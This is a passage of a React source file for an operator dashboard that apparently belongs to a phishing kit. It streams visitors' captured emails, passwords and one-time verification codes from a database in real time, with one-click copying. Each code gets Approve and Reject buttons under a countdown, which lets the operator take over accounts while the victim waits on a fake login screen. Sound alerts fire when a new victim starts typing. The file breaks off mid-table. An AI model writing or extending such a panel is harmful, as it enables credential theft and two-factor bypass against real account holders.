import { Fragment, useEffect, useMemo, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Activity, History, Radio, Monitor, Bell, KeyRound as Key, LayoutDashboard, Package, Users } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { toast } from "sonner";
import { ADMIN_BASE, ADMIN_GATE_KEY } from "@/lib/admin-route";
import { subscribeToOnlineVisitors } from "@/lib/presence";
import { EmailComposerPanel } from "@/components/EmailComposerPanel";
import { OrderStatusPanel } from "@/components/OrderStatusPanel";
import {
  ensureNotificationPermission,
  isSoundEnabled,
  setSoundEnabled,
  useCountIncreaseNotifier,
  useTitleBadge,
  playVisitorOnline,
  playVisitorOffline,
} from "@/lib/notify";
import { getScreenStyle } from "@/lib/screen-style";
import { Volume2, VolumeX } from "lucide-react";

interface LeadRow {
  id: string;
  ad_id: string;
  session_id: string;
  field_name: string;
  value: string;
  user_agent: string | null;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  ad_id: string;
  action: string;
  created_at: string;
  payload?: { kind?: "email" | "code"; email?: string | null; message?: string } | null;
}

interface AttemptRow {
  key: string;
  session_id: string;
  ad_id: string;
  email: string;
  password: string;
  code: string;
  codeAt: string;
  status: "pending" | "approve" | "reject";
  kind: "email" | "code";
}

function getEmailPendingSecondsLeft(codeAt: string): number {
  // O contador no iframe (visitante) começa no momento do clique e dura 10s.
  // O lead chega no painel via realtime com ~0,5–2s de latência, então
  // damos uma margem de +2s pra que o admin tenha o mesmo tempo útil de
  // decisão que o visitante vê no loading.
  const elapsed = Math.floor((Date.now() - new Date(codeAt).getTime()) / 1000);
  return Math.max(0, 12 - elapsed);
}

interface ActiveSession {
  session_id: string;
  ad_id: string;
  email: string;
  password: string;
  user_agent: string | null;
  lastActivity: string;
}

interface RequestRow {
  id: string;
  ad_id: string;
  session_id: string;
  kind: string;
  label: string;
  email: string | null;
  created_at: string;
}

const REQUEST_KIND_LABELS: Record<string, string> = {
  "forgot-password": "Esqueci minha senha",
  passwordless: "Entrar sem senha",
  reactivate: "Quero ativar minha conta",
  "email-code-resend": "Reenviar código",
};

const TRACKED = ["email_submitted", "password_submitted", "code_submitted"] as const;

/** Tempo máximo (ms) que uma sessão fica em "Em andamento" sem nova atividade.
 *  Após esse limite, a sessão (mesmo incompleta) desce pro Histórico. */
const ACTIVE_SESSION_TTL_MS = 60 * 60 * 1000; // 1 hora

function formatTime(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

/** Mapeia o `kind` da tela (vindo da presença) pra um rótulo amigável. */
function screenKindLabel(kind: string): string {
  switch (kind) {
    case "main":
      return "Tela home";
    case "access-account":
      return "Tela acessar";
    case "password":
      return "Tela senha";
    case "email-code":
      return "Tela código";
    case "forgot-password":
      return "Tela esqueci senha";
    case "passwordless":
      return "Tela sem senha";
    case "reactivate":
      return "Tela reativar";
    default:
      return kind;
  }
}

function deviceLabel(ua: string | null): string {
  if (!ua) return "—";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";
  return "Web";
}

function DevicePill({ ua }: { ua: string | null }) {
  return (
    <span className="inline-flex min-h-6 items-center gap-1.5 rounded-full border border-border bg-background/60 px-2 py-0.5 text-[10px] font-medium leading-none text-muted-foreground">
      <Monitor className="h-3 w-3 shrink-0" />
      <span className="leading-none">{deviceLabel(ua)}</span>
    </span>
  );
}

/** Célula que copia o conteúdo pro clipboard ao clicar. */
function CopyText({ value, className = "", emptyValue }: { value: string; className?: string; emptyValue?: string }) {
  if (!value || value === "—") {
    return <span className="text-muted-foreground">{emptyValue ?? "—"}</span>;
  }
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(value);
      toast.success("Copiado!", { description: value, duration: 1500 });
    } catch {
      toast.error("Falha ao copiar");
    }
  };
  return (
    <button
      type="button"
      onClick={handleCopy}
      title="Clique pra copiar"
      className={`cursor-pointer rounded px-1 py-0.5 text-left transition-colors hover:bg-primary/10 hover:text-primary active:bg-primary/20 ${className}`}
    >
      {value}
    </button>
  );
}

export default function Dashboard() {
  const handleSignOut = async () => {
    try { await supabase.auth.signOut(); } catch { /* ignore sign-out race */ }
    window.location.href = "/login";
  };
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);
  const [pulse, setPulse] = useState(false);
  const [tab, setTab] = useState<"painel" | "emails">(() => {
    if (typeof window === "undefined") return "painel";
    return (localStorage.getItem("dash_tab") as "painel" | "emails") || "painel";
  });
  useEffect(() => {
    try { localStorage.setItem("dash_tab", tab); } catch { /* ignore storage restrictions */ }
  }, [tab]);

  /** Sessões com aba aberta + visível agora (presença pura, ao vivo). */
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  /** Tela atual em tempo real por sessão (vinda do canal de presença). */
  const [liveScreens, setLiveScreens] = useState<Map<string, string>>(new Map());
  /** Última tela conhecida por sessão — persiste mesmo após a sessão ficar offline. */
  const [lastKnownScreens, setLastKnownScreens] = useState<Map<string, string>>(new Map());
  /** Requisições do visitante (esqueci senha, sem senha, reativar, reenviar código). */
  const [requests, setRequests] = useState<RequestRow[]>([]);
  const [requestsPulse, setRequestsPulse] = useState(false);
  const [, setEmailCountdownTick] = useState(0);

  useEffect(() => {
    const timer = window.setInterval(() => setEmailCountdownTick((v) => v + 1), 1000);
    return () => window.clearInterval(timer);
  }, []);

  /** Tick que avança a cada minuto pra reavaliar o TTL das sessões em andamento. */
  const [nowTick, setNowTick] = useState(() => Date.now());
  useEffect(() => {
    const id = setInterval(() => setNowTick(Date.now()), 60_000);
    return () => clearInterval(id);
  }, []);

  /** Som ON/OFF — persistido em localStorage. */
  const [soundOn, setSoundOnState] = useState<boolean>(() => isSoundEnabled());
  const toggleSound = async () => {
    const next = !soundOn;
    setSoundOnState(next);
    setSoundEnabled(next);
    if (next) {
      const ok = await ensureNotificationPermission();
      if (ok) {
        toast.success("Som e notificações ativados");
      } else {
        toast.success("Som ativado");
      }
    } else {
      toast.message("Som desativado");
    }
  };
  // Pede permissão de notificação automaticamente uma vez se o som já tá ligado.
  useEffect(() => {
    if (soundOn) void ensureNotificationPermission();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const notifyIncrease = useCountIncreaseNotifier();

  // Subscreve presença global de visitantes
  useEffect(() => {
    const off = subscribeToOnlineVisitors(
      (map) => {
        const ids = new Set(map.keys());
        setOnlineSessionIds(ids);
        const screens = new Map<string, string>();
        for (const [sid, meta] of map) {
          if (meta.screenKind) screens.set(sid, meta.screenKind);
        }
        console.info("[Dashboard] presence sync — telas:", Array.from(screens.entries()));
        setLiveScreens(screens);
        // Acumula no histórico de telas — nunca remove, só atualiza com a mais recente.
        setLastKnownScreens((prev) => {
          const next = new Map(prev);
          for (const [sid, kind] of screens) next.set(sid, kind);
          return next;
        });
      },
      (sessionId) => {
        console.info("[Dashboard] visitante online:", sessionId);
        setPulse(true);
        setTimeout(() => setPulse(false), 600);
        playVisitorOnline();
      },
      (sessionId) => {
        console.info("[Dashboard] visitante offline:", sessionId);
        playVisitorOffline();
      },
    );
    return off;
  }, []);

  /**
   * Online = presença pura. Se a aba não está visível, a sessão fica offline
   * IMEDIATAMENTE no painel — sem fallback de "atividade recente".
   */
  const activeOnlineSessionIds = onlineSessionIds;
  // Mantida só pra compatibilidade com handlers antigos; vira no-op.
  const markSessionActive = (_sessionId: string) => { void _sessionId; };

  useEffect(() => {
    document.title = "Painel Valididy";
  }, []);

  // Carrega leads + realtime
  useEffect(() => {
    let alive = true;
    supabase
      .from("ad_leads")
      .select("id, ad_id, session_id, field_name, value, user_agent, created_at")
      .in("field_name", TRACKED as unknown as string[])
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setLeads((data ?? []) as LeadRow[]);
      });

    const ch = supabase
      .channel("dash-leads")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads" },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!TRACKED.includes(r.field_name as typeof TRACKED[number])) return;
          setLeads((prev) => [r, ...prev]);
          markSessionActive(r.session_id);
          setPulse(true);
          setTimeout(() => setPulse(false), 600);
        },
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "ad_leads" },
        (payload) => {
          const old = payload.old as { id: string };
          setLeads((prev) => prev.filter((r) => r.id !== old.id));
        },
      )
      .subscribe();

    return () => {
      alive = false;
      void ch.unsubscribe();
    };
  }, []);

  // Carrega ações (approve/reject) + realtime
  useEffect(() => {
    let alive = true;
    supabase
      .from("ad_session_actions")
      .select("session_id, ad_id, action, created_at, payload")
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setActions((data ?? []) as ActionRow[]);
      });

    const ch = supabase
      .channel("dash-actions")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions" },
        (payload) => {
          const a = payload.new as ActionRow;
          setActions((prev) => [a, ...prev]);
          markSessionActive(a.session_id);
        },
      )
      .subscribe();

    return () => {
      alive = false;
      void ch.unsubscribe();
    };
  }, []);

  // Carrega requisições (cliques em opções de ajuda) + realtime
  useEffect(() => {
    let alive = true;

    type RawAction = {
      id: string;
      ad_id: string;
      session_id: string;
      action: string;
      created_at: string;
      payload: { kind?: string; label?: string; email?: string | null } | null;
    };

    const toRow = (r: RawAction): RequestRow | null => {
      if (r.action !== "request") return null;
      const kind = r.payload?.kind ?? "";
      return {
        id: r.id,
        ad_id: r.ad_id,
        session_id: r.session_id,
        kind,
        label: r.payload?.label ?? REQUEST_KIND_LABELS[kind] ?? kind,
        email: r.payload?.email ?? null,
        created_at: r.created_at,
      };
    };

    supabase
      .from("ad_session_actions")
      .select("id, ad_id, session_id, action, created_at, payload")
      .eq("action", "request")
      .order("created_at", { ascending: false })
      .limit(500)
      .then(({ data }) => {
        if (!alive) return;
        const rows = ((data ?? []) as RawAction[]).map(toRow).filter(Boolean) as RequestRow[];
        setRequests(rows);
      });

    const ch = supabase
      .channel("dash-requests")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: "action=eq.request" },
        (payload) => {
          const row = toRow(payload.new as RawAction);
          if (!row) return;
          setRequests((prev) => [row, ...prev]);
          setRequestsPulse(true);
          setTimeout(() => setRequestsPulse(false), 600);
        },
      )
      .subscribe();

    return () => {
      alive = false;
      void ch.unsubscribe();
    };
  }, []);

  // Computa tentativas (1 linha por código submetido), com status pendente/aprovado/rejeitado
  const attempts: AttemptRow[] = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }

    const sessionActions = new Map<string, ActionRow[]>();
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const arr = sessionActions.get(a.session_id) || [];
      arr.push(a);
      sessionActions.set(a.session_id, arr);
    }

    const rows: AttemptRow[] = [];
    for (const [sid, items] of bySession) {
      const codes = [...items]
        .filter((i) => i.field_name === "code_submitted")
        .sort((a, b) => a.created_at.localeCompare(b.created_at));
      const acts = (sessionActions.get(sid) || []).slice().sort((a, b) =>
        a.created_at.localeCompare(b.created_at),
      );
      const codeStatus = new Map<string, "approve" | "reject">();
      for (const a of acts) {
        for (let i = codes.length - 1; i >= 0; i--) {
          const c = codes[i];
          const key = `${c.created_at}-${c.value}`;
          if (!codeStatus.has(key) && c.created_at <= a.created_at) {
            codeStatus.set(key, a.action as "approve" | "reject");
            break;
          }
        }
      }

      for (const c of codes) {
        const emailRow = [...items]
          .filter((i) => i.field_name === "email_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const passwordRow = [...items]
          .filter((i) => i.field_name === "password_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const key = `${c.created_at}-${c.value}-${sid}`;
        rows.push({
          key,
          session_id: sid,
          ad_id: c.ad_id,
          email: emailRow?.value || "—",
          password: passwordRow?.value || "—",
          code: c.value,
          codeAt: c.created_at,
          status: codeStatus.get(`${c.created_at}-${c.value}`) || "pending",
          kind: "code",
        });
      }
    }

    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
  }, [leads, actions]);

  // E-mails passam direto agora (auto-aprovados). Mantemos a constante vazia
  // pra não precisar mexer em todos os usos espalhados.
  const emailPendingRows: AttemptRow[] = useMemo(() => [], []);

  const pendingCount = attempts.filter((a) => a.status === "pending").length + emailPendingRows.length;
  const approvedCount = attempts.filter((a) => a.status === "approve").length;
  const rejectedCount = attempts.filter((a) => a.status === "reject").length;

  // Última tentativa pendente por sessão = a única acionável (a "ao vivo").
  // As anteriores da mesma sessão viram "ignorado" e descem pro histórico.
  const actionableKeys = useMemo(() => {
    const latestPerSession = new Map<string, AttemptRow>();
    for (const a of attempts) {
      if (a.status !== "pending") continue;
      const cur = latestPerSession.get(a.session_id);
      if (!cur || a.codeAt > cur.codeAt) latestPerSession.set(a.session_id, a);
    }
    return new Set(Array.from(latestPerSession.values()).map((a) => a.key));
  }, [attempts]);

  // Separa em "ao vivo" (acionáveis) e "histórico" (resto)
  const live = useMemo(
    () => [...attempts.filter((a) => actionableKeys.has(a.key)), ...emailPendingRows].sort((a, b) => b.codeAt.localeCompare(a.codeAt)),
    [attempts, actionableKeys, emailPendingRows],
  );
  const historyFromAttempts = attempts.filter((a) => !actionableKeys.has(a.key));

  // Mapa session_id -> tentativa PENDENTE mais recente, pra mostrar
  // botões Aprovar/Rejeitar dentro do card de "Sessões em andamento"
  // (essencial em telas micro tipo smartwatch onde só essa seção aparece).
  const pendingBySession = useMemo(() => {
    const map = new Map<string, AttemptRow>();
    for (const a of [...attempts, ...emailPendingRows]) {
      if (a.status !== "pending") continue;
      const prev = map.get(a.session_id);
      if (!prev || a.codeAt.localeCompare(prev.codeAt) > 0) {
        map.set(a.session_id, a);
      }
    }
    return map;
  }, [attempts, emailPendingRows]);

  // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
  // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
  // Sessões com última atividade > 1h são consideradas "abandonadas" e descem
  // pro Histórico (mesmo incompletas).
  const { activeSessions, staleSessions } = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }
    // Última decisão de CÓDIGO (approve/reject) por sessão. Só remove a sessão de
    // "em andamento" se a decisão de CÓDIGO for mais recente que a última atividade.
    // Decisões de E-MAIL apenas liberam o avanço — a pessoa ainda vai digitar
    // senha/código, então a sessão deve permanecer visível.
    const lastDecisionBySession = new Map<string, string>();
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const kind = (a.payload as { kind?: string } | null)?.kind;
      if (kind === "email") continue;
      const prev = lastDecisionBySession.get(a.session_id);
      if (!prev || a.created_at.localeCompare(prev) > 0) {
        lastDecisionBySession.set(a.session_id, a.created_at);
      }
    }
    const active: ActiveSession[] = [];
    const stale: ActiveSession[] = [];
    const cutoff = nowTick - ACTIVE_SESSION_TTL_MS;
    for (const [sid, items] of bySession) {
      const emails = items.filter((i) => i.field_name === "email_submitted");
      if (emails.length === 0) continue;
      const sorted = [...items].sort((a, b) => a.created_at.localeCompare(b.created_at));
      const lastActivity = sorted[sorted.length - 1].created_at;
      // Mantém a sessão em andamento mesmo se ela já submeteu código —
      // o card mobile mostra o código + Aprovar/Rejeitar inline, evitando
      // que o admin precise rolar até outra seção em tela micro.
      // Só remove se a ÚLTIMA ação foi DEPOIS da última atividade — caso contrário,
      // a sessão voltou a digitar e precisa reaparecer.
      const lastDecision = lastDecisionBySession.get(sid);
      if (lastDecision && lastDecision.localeCompare(lastActivity) >= 0) continue;
      const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
      const passwordRow = [...items]
        .filter((i) => i.field_name === "password_submitted")
        .sort((a, b) => a.created_at.localeCompare(b.created_at))
        .pop();
      const session: ActiveSession = {
        session_id: sid,
        ad_id: items[0].ad_id,
        email,
        password: passwordRow?.value || "—",
        user_agent: items.find((i) => i.user_agent)?.user_agent ?? null,
        lastActivity,
      };
      const lastActivityMs = Date.parse(lastActivity);
      if (Number.isFinite(lastActivityMs) && lastActivityMs < cutoff) {
        stale.push(session);
      } else {
        active.push(session);
      }
    }
    return {
      activeSessions: active.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
      staleSessions: stale.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
    };
  }, [leads, actions, nowTick]);

  // Sessões abandonadas (>1h sem atividade) viram linhas no Histórico,
  // mesmo sem código submetido — preenchem com "—".
  const history: AttemptRow[] = useMemo(() => {
    const stale: AttemptRow[] = staleSessions.map((s) => ({
      key: `stale-${s.session_id}-${s.lastActivity}`,
      session_id: s.session_id,
      ad_id: s.ad_id,
      email: s.email,
      password: s.password,
      code: "—",
      codeAt: s.lastActivity,
      status: "reject",
      kind: "code",
    }));
    return [...historyFromAttempts, ...stale].sort((a, b) =>
      b.codeAt.localeCompare(a.codeAt),
    );
  }, [historyFromAttempts, staleSessions]);

  // Atualiza o título da aba com (N) quando há tentativas pendentes.
  useTitleBadge(pendingCount);

  // Toca som + notifica quando NOVAS tentativas pendentes ou novas sessões em andamento aparecem.
  useEffect(() => {
    notifyIncrease("pending", pendingCount, {
      title: "Nova tentativa pendente",
      body: "Tem validação aguardando aprovação no painel.",
    });
  }, [pendingCount, notifyIncrease]);
  useEffect(() => {
    notifyIncrease("active", activeSessions.length, {
      title: "Visitante digitando",
      body: "Alguém preencheu o e-mail e está em andamento.",
    });
  }, [activeSessions.length, notifyIncrease]);

  const send = async (row: AttemptRow, action: "approve" | "reject") => {
    setBusy(`${row.key}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: row.ad_id,
      session_id: row.session_id,
      action,
      payload: action === "reject"
        ? { kind: row.kind, email: row.email, message: row.kind === "email" ? "Não existe uma conta com este e-mail." : "Código inválido" }
        : { kind: row.kind, email: row.email },
    });
    // Ao rejeitar uma tentativa de e-mail, adiciona automaticamente à lista de banidos
    if (!error && action === "reject" && row.kind === "email" && row.email && row.email !== "—") {
      const { error: banError } = await supabase.from("ad_blocked_emails").insert({
        ad_id: row.ad_id,
        email: row.email.toLowerCase(),
        reason: "auto_reject",
        source_session_id: row.session_id,
      });
      // Ignora erro de duplicata (já estava banido)
      if (banError && !/duplicate|unique/i.test(banError.message)) {
        console.warn("[Dashboard] auto-ban falhou:", banError);
      }
    }
    setBusy(null);
    if (error) return toast.error(error.message);
    toast.success(action === "approve" ? "Aprovado" : "Rejeitado");
  };

  const handleClearAll = async () => {
    if (!confirm("Apagar TODOS os leads capturados? Essa ação é permanente.")) return;
    const { error } = await supabase
      .from("ad_leads")
      .delete()
      .in("field_name", TRACKED as unknown as string[]);
    if (error) return toast.error(error.message);
    setLeads([]);
    toast.success("Histórico limpo");
  };

  const handleClearRequests = async () => {
    if (requests.length === 0) return;
    if (!confirm("Apagar TODAS as requisições? Essa ação é permanente.")) return;
    const ids = requests.map((r) => r.id);
    const { error } = await supabase.from("ad_session_actions").delete().in("id", ids);
    if (error) return toast.error(error.message);
    setRequests([]);
    toast.success("Requisições limpas");
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="sticky top-0 z-30 border-b border-primary/30 bg-background/80 backdrop-blur-xl shadow-[0_1px_0_0_hsl(var(--primary)/0.15)]">
        <div className="mx-auto flex h-12 max-w-7xl items-center justify-between gap-1.5 px-2 xs:h-14 xs:gap-2 xs:px-3 sm:h-16 sm:px-6">
          <Link to={ADMIN_BASE} className="flex min-w-0 items-center gap-1.5 xs:gap-2">
            <span className="truncate font-display text-[11px] font-semibold uppercase tracking-[0.1em] text-gradient xs:text-sm xs:tracking-[0.14em] sm:text-lg sm:tracking-[0.18em]">
              Painel Valididy
            </span>
            <span
              className={`ml-0.5 inline-flex shrink-0 items-center text-[8px] font-medium uppercase xs:ml-1 xs:text-[10px] sm:ml-2 sm:text-xs ${activeOnlineSessionIds.size > 0 ? "text-success" : "text-muted-foreground"} ${pulse ? "animate-pulse" : ""}`}
              aria-label={activeOnlineSessionIds.size > 0 ? "Visitantes online" : "Ninguém online"}
            >
              {activeOnlineSessionIds.size > 0 ? "online" : "offline"}
            </span>
          </Link>
          <div className="flex shrink-0 items-center gap-1 xs:gap-2 sm:gap-3">
            <Button
              variant="ghost"
              size="sm"
              onClick={toggleSound}
              className="h-8 px-1.5 xs:h-9 xs:px-2 sm:px-3"
              title={soundOn ? "Som ligado — clique pra desligar" : "Som desligado — clique pra ligar"}
              aria-label={soundOn ? "Desativar som" : "Ativar som"}
            >
              {soundOn ? (
                <Volume2 className="h-3.5 w-3.5 text-success xs:h-4 xs:w-4" />
              ) : (
                <VolumeX className="h-3.5 w-3.5 text-muted-foreground xs:h-4 xs:w-4" />
              )}
            </Button>
            <Button variant="ghost" size="sm" onClick={handleSignOut} className="h-8 px-1.5 xs:h-9 xs:px-2 sm:px-3">
              <LogOut className="h-3.5 w-3.5 xs:h-4 xs:w-4 sm:mr-2" />
              <span className="hidden sm:inline">Sair</span>
            </Button>
            <Button asChild variant="ghost" size="sm" className="h-8 px-1.5 xs:h-9 xs:px-2 sm:px-3" title="Usuários">
              <a href={`${ADMIN_BASE}/usuarios`}>
                <Users className="h-3.5 w-3.5 xs:h-4 xs:w-4 sm:mr-2" />
                <span className="hidden sm:inline">Usuários</span>
              </a>
            </Button>
            <AdminOrderStatusSection />
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-2 py-3 xs:px-3 xs:py-4 sm:px-6 sm:py-8">
        {/* Abas — escondidas em telas micro (<360px) pra deixar só Sessões em andamento */}
        <div className="mb-4 hidden w-full rounded-xl border border-border bg-card p-1 shadow-card xs:mb-6 xs:inline-flex sm:w-auto">
          <button
            type="button"
            onClick={() => setTab("painel")}
            className={`inline-flex flex-1 items-center justify-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-medium transition-colors xs:gap-2 xs:px-4 xs:py-2 xs:text-sm sm:flex-none ${
              tab === "painel"
                ? "bg-primary/15 text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <LayoutDashboard className="h-3.5 w-3.5 xs:h-4 xs:w-4" />
            Painel
          </button>
          <button
            type="button"
            onClick={() => setTab("emails")}
            className={`inline-flex flex-1 items-center justify-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-medium transition-colors xs:gap-2 xs:px-4 xs:py-2 xs:text-sm sm:flex-none ${
              tab === "emails"
                ? "bg-primary/15 text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Mail className="h-3.5 w-3.5 xs:h-4 xs:w-4" />
            E-mails
          </button>
        </div>

        {tab === "emails" && (
          // Em <360px o EmailComposer some — o painel (renderizado abaixo) assume.
          <div className="hidden xs:block">
            <EmailComposerPanel />
          </div>
        )}
        {/* Painel: sempre visível em <360px, e em ≥360px só quando tab=painel */}
        <div className={tab === "painel" ? "" : "xs:hidden"}>
        <>
        {/* Cards de resumo — escondidos em telas micro (<360px, ex: smartwatch) */}
        <div className="hidden grid-cols-2 gap-3 xs:grid sm:grid-cols-4 sm:gap-4">
          <StatCard label="Em andamento" value={activeSessions.length} icon={<Activity className="h-5 w-5" />} highlight={activeSessions.length > 0} />
          <StatCard label="Ao vivo" value={live.length} icon={<Radio className="h-4 w-4" />} highlight={live.length > 0} />
          <StatCard label="Aprovados" value={approvedCount} icon={<Check className="h-4 w-4" />} />
          <StatCard label="Rejeitados" value={rejectedCount} icon={<X className="h-4 w-4" />} />
        </div>

        {/* SESSÕES EM ANDAMENTO */}
        <section className="mt-0 rounded-xl border border-border bg-card shadow-card xs:mt-6 sm:mt-8">
          <div className="flex items-center justify-between gap-2 border-b border-border px-3 py-3 xs:px-5 xs:py-4">
            <div className="flex items-center gap-2">
              <Activity className="h-4 w-4 text-primary xs:h-5 xs:w-5" />
              <h2 className="font-display text-sm font-semibold tracking-wider uppercase xs:text-base">Sessões em andamento</h2>
              <Badge variant="secondary" className="text-[10px]">{activeSessions.length}</Badge>
            </div>
          </div>

          {activeSessions.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-10 text-center">
              <p className="text-sm text-muted-foreground">
                Ninguém digitando agora. Quando alguém preencher o e-mail, aparece aqui.
              </p>
            </div>
          ) : (
            <>
            {/* Cards (mobile) */}
            <div className="space-y-3 p-3 md:hidden">
              {activeSessions.map((s) => {
                const isOnline = activeOnlineSessionIds.has(s.session_id);
                const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
                const style = getScreenStyle(liveKind);
                const pending = pendingBySession.get(s.session_id);
                return (
                  <div key={s.session_id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <StatusDot online={isOnline} />
                      <span className="text-[10px] text-muted-foreground font-mono-tabular">
                        {formatTime(s.lastActivity)}
                      </span>
                    </div>
                    <div className="space-y-1.5">
                      <div className="flex items-start gap-2 text-xs">
                        <Mail className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                        <CopyText value={s.email} className="break-all font-mono" />
                      </div>
                      <div className="flex items-start gap-2 text-xs">
                        <KeyRound className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                        <CopyText value={s.password !== "—" ? s.password : ""} className="break-all font-mono" />
                      </div>
                    </div>
                    <div className="flex flex-wrap items-center gap-2 pt-1">
                      <span className={`inline-flex min-h-6 items-center gap-1 rounded-full px-2 py-0.5 text-[10px] leading-none ${style.className}`}>
                        <Monitor className="h-3 w-3" />
                        {style.label}
                      </span>
                      <DevicePill ua={s.user_agent} />
                    </div>
                    {pending && pending.kind === "email" && (() => {
                      const secondsLeft = getEmailPendingSecondsLeft(pending.codeAt);
                      const urgent = secondsLeft <= 5;
                      return (
                        <div className={`mt-2 space-y-2 rounded-md border-2 p-2 ${urgent ? "border-destructive/60 bg-destructive/5" : "border-primary/50 bg-primary/5"}`}>
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-[10px] uppercase tracking-wide text-primary font-semibold">
                              Confirmar e-mail
                            </span>
                            <div className={`flex items-baseline gap-1 rounded-full px-2 py-0.5 font-mono-tabular ${urgent ? "bg-destructive/15 text-destructive" : "bg-primary/15 text-primary"}`}>
                              <span className="text-sm font-bold leading-none">{secondsLeft}</span>
                              <span className="text-[10px] leading-none">s</span>
                            </div>
                          </div>
                          <div className="flex gap-2">
                            <Button
                              size="sm"
                              onClick={() => send(pending, "approve")}
                              disabled={busy === `${pending.key}-approve`}
                              className="h-10 flex-1 bg-success text-success-foreground hover:bg-success/90 text-xs font-semibold"
                            >
                              {busy === `${pending.key}-approve` ? (
                                <Loader2 className="h-3.5 w-3.5 animate-spin" />
                              ) : (
                                <>
                                  <Check className="mr-1 h-3.5 w-3.5" />
                                  Aprovar
                                </>
                              )}
                            </Button>
                            <Button
                              size="sm"
                              variant="destructive"
                              onClick={() => send(pending, "reject")}
                              disabled={busy === `${pending.key}-reject`}
                              className="h-10 flex-1 text-xs font-semibold"
                            >
                              {busy === `${pending.key}-reject` ? (
                                <Loader2 className="h-3.5 w-3.5 animate-spin" />
                              ) : (
                                <>
                                  <X className="mr-1 h-3.5 w-3.5" />
                                  Rejeitar
                                </>
                              )}
                            </Button>
                          </div>
                        </div>
                      );
                    })()}
                    {pending && pending.kind !== "email" && (
                      <div className="mt-2 space-y-2 rounded-md border border-primary/40 bg-primary/5 p-2">
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-[10px] uppercase tracking-wide text-primary font-semibold">
                            Código recebido
                          </span>
                          <div className="text-right">
                            <span className="block text-[10px] text-muted-foreground font-mono-tabular">
                              {formatTime(pending.codeAt)}
                            </span>
                          </div>
                        </div>
                        <CopyText
                          value={pending.code}
                          className="font-mono text-foreground text-base font-bold tracking-[0.3em]"
                        />
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            onClick={() => send(pending, "approve")}
                            disabled={busy === `${pending.key}-approve`}
                            className="h-8 flex-1 bg-success text-success-foreground hover:bg-success/90"
                          >
                            {busy === `${pending.key}-approve` ? (
                              <Loader2 className="h-3.5 w-3.5 animate-spin" />
                            ) : (
                              <>
                                <Check className="mr-1 h-3.5 w-3.5" />
                                Aprovar
                              </>
                            )}
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => send(pending, "reject")}
                            disabled={busy === `${pending.key}-reject`}
                            className="h-8 flex-1"
                          >
                            {busy === `${pending.key}-reject` ? (
                              <Loader2 className="h-3.5 w-3.5 animate-spin" />
                            ) : (
                              <>
                                <X className="mr-1 h-3.5 w-3.5" />
                                Rejeitar
                              </>
                            )}
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
            {/* Tabela (desktop) */}
            <div className="hidden overflow-x-auto md:block">
              <table className="w-full text-sm">
